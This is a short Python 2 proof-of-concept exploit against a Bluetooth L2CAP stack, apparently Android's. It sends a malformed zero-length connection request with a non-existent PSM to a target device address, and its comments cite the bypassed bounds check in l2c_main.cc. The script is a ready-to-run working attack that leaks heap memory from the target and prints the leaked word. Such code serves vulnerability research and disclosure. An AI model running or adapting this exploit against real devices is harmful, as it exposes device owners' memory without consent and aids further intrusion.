#!/usr/bin/env python2

import os
import sys
from l2cap_infra import *
L2CAP_SIGNALLING_CID = 0x01
L2CAP_CMD_CONN_REQ = 0x02
def main(src_hci, dst_bdaddr):
    l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
    # This will leak 2 bytes from the heap
    print "Sending L2CAP_CMD_CONN_REQ in L2CAP connection..."
    cmd_code = L2CAP_CMD_CONN_REQ
    cmd_id = 0x41               # not important
    cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
    non_existent_psm = 0x3333   # Non-existent Protocol/Service Multiplexer id, so l2cu_find_rcb_by_psm() returns NULL and l2cu_reject_connection() is called
    # here we use L2CAP_SIGNALLING_CID as cid, so l2c_rcv_acl_data() calls process_l2cap_cmd():
    # 170    /* Send the data through the channel state machine */
    # 171    if (rcv_cid == L2CAP_SIGNALLING_CID) {
    # 172      process_l2cap_cmd(p_lcb, p, l2cap_len);
    l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SIGNALLING_CID) / Raw(struct.pack('<BBHH', cmd_code, cmd_id, cmd_len, non_existent_psm)))
    l2cap_loop.on(lambda pkt: True,
                  lambda loop, pkt: pkt)
    # And printing the returned data.
    pkt = l2cap_loop.cont()[0]
    print "Response: %s\n" % repr(pkt)
    # print "Packet layers: %s" % pkt.summary()
    # The response packet contains 3 layers: L2CAP_Hdr / L2CAP_CmdHdr / L2CAP_ConnResp
    # The response contains 1 leaked word in the 'scid' field of the L2CAP_ConnResp layer
    print "Leaked word: 0x%04x" % pkt[2].scid
    l2cap_loop.finish()
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: l2cap01.py <src-hci> <dst-bdaddr>")
    else:
        if os.getuid():
            print "Error: This script must be run as root."
        else:
            main(*sys.argv[1:])